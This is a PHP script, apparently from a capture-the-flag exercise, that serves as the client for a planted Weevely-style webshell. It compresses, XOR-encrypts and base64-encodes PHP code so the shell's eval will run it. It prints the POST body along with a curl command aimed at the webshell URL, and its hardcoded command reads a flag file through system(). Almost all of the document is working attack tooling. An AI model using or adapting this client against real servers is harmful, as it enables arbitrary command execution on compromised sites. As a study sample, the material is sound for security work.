<?php

// Webshell 配置
// 这些是 webshell 内部硬编码的参数
$key = "7ccf8192";
$kh = "528271413977";
$kf = "f541527062a9";

/**
 * XOR 加解密函数
 * @param string $data 要处理的数据
 * @param string $key 密钥
 * @return string 处理后的数据
 */
function xor_encrypt_decrypt($data, $key) {
    $result = '';
    $dataLen = strlen($data);
    $keyLen = strlen($key);
    for ($i = 0; $i < $dataLen; $i++) {
        $result .= $data[$i] ^ $key[$i % $keyLen];
    }
    return $result;
}

/**
 * 生成发送给webshell的payload
 * webshell端执行的逻辑是：eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
 * 所以我们需要对 php_code 进行 gzcompress -> xor -> base64_encode
 * @param string $phpCode 要执行的PHP代码
 * @param string $key XOR密钥
 * @return string 编码后的payload
 */
function generate_payload($phpCode, $key) {
    // 1. 压缩 PHP 代码
    $compressedCode = gzcompress($phpCode);

    // 2. XOR 加密
    $encryptedCode = xor_encrypt_decrypt($compressedCode, $key);

    // 3. Base64 编码
    $encodedPayload = base64_encode($encryptedCode);

    return $encodedPayload;
}

// ===================================================================
// 主程序逻辑
// ===================================================================

echo "Enter PHP code (e.g., system('whoami;'); or 'exit' to quit):\n";

while (true) {
    $handle = fopen("php://stdin", "r");
    echo "> ";
    $command = 'system("cat /flag");';
    if (strtolower($command) === 'exit') {
        break;
    }

    // 生成 payload
    $payload = generate_payload($command, $key);
    $fullPostData = $kh . $payload . $kf;

    echo "\n--- Generated POST Data (Send this as the raw request body) ---\n";
    echo $fullPostData . "\n";
    echo "----------------------------------------------------------------\n";

    echo "\nExample curl command (replace http://your_target_website.com/path/to/webshell.php with your actual webshell URL):\n";
    echo "curl -X POST -d '" . addslashes($fullPostData) . "' http://your_target_website.com/path/to/webshell.php\n";
    echo "----------------------------------------------------------------\n\n";
}

echo "Exiting.\n";

?>